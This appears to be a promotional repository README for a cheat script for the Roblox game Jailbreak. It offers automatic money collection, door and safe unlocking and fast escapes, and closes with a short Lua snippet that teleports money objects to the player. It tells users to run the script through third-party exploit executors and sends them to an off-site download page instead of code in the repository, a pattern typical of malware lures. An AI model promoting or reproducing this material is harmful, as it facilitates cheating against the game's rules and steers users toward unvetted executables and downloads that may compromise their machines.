<p align="center">
  <h1 align="center">🚓 Roblox Jailbreak Script 🚓</h1>
  <strong>
    <a href="https://sites.google.com/view/nexol" target="_blank" style="font-size: 1.3em; text-decoration: none; color: #fff; background-color: #0078d7; padding: 12px 30px; border-radius: 8px; display: inline-block;">
      ⬇️ Download Script Here ⬇️
    </a>
  </strong>
</p>

---

Welcome to the **Roblox Jailbreak Script** repository — your ultimate tool to automate and supercharge your gameplay in *Jailbreak*!  
Experience smooth automation, lightning-fast escapes, and effortless cash collection with this powerful and easy-to-use script.

---

## ✨ Features

| Feature                     | Description                                |
|-----------------------------|--------------------------------------------|
| 💰 Automatic Money Collection | Collect cash automatically while you play |
| 🚪 Auto Door & Safe Unlock   | Instantly open doors and safes             |
| 🏃 Fast Jailbreak Escape     | Get out of prison within seconds           |
| 🔔 Event Notifications       | Stay updated with important in-game alerts|
| 🎮 Hotkey Support           | Control script features with customizable keys |

---

## ⚙️ Installation

1. Download or clone this repository  
2. Launch **Roblox** and join the *Jailbreak* game  
3. Open your preferred exploit/executor (e.g., Synapse X, Krnl)  
4. Paste the script into the executor and run it  

---

## 🚀 Usage

- Run the script **while in-game**  
- Follow the on-screen instructions or use **hotkeys** for quick control  
- Customize script settings in the configuration file (if available) for a personalized experience  

---

## 📜 Script Example

```lua
-- Roblox Jailbreak Auto Money Collection Script Example

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local RunService = game:GetService("RunService")

local function collectMoney()
    for _, money in pairs(workspace:GetChildren()) do
        if money.Name == "Money" and money:IsA("Part") then
            money.CFrame = player.Character.HumanoidRootPart.CFrame
        end
    end
end

RunService.Heartbeat:Connect(function()
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        collectMoney()
    end
end)
